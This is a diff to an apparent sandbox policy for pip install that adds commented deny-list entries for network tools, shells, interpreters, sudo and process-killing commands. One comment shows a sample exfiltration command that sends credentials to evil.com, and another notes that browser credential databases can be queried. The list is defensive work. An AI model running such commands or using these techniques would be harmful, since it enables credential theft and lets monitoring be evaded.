@@ -20,16 +20,33 @@ commands:
   allow:
     - git
   deny:
+    # HTTP clients — pip should use its own HTTP client, not shell out to curl
     - curl
     - wget
+    # Remote access — no legitimate reason for pip install to open SSH sessions
     - ssh
+    # Raw networking — can open arbitrary TCP/UDP connections, reverse shells
     - nc
     - ncat
+    # Privilege escalation — pip install should not need root
     - "*sudo*"
+    # Shell interpreters — prevent proxy execution attacks (setup.py → sh → payload)
     - sh
     - bash
+    # Interpreters — prevent proxy execution via other runtimes
     - perl
     - ruby
+    # Scripting interpreters — arbitrary code execution bypassing traced process
+    - osascript    # AppleScript/JXA: shell, file, network via scripting bridge
+    - swift
+    - java
+    # Data exfiltration
+    - open         # opens URLs in browser: open "http://evil.com/?d=$(cat creds)"
+    - sqlite3      # queries browser credential DBs (Chrome Login Data, etc.)
+    # Anti-tracing — can terminate the malwi agent/CLI
+    - kill
+    - pkill
+    - killall
 
 network:
   allow:
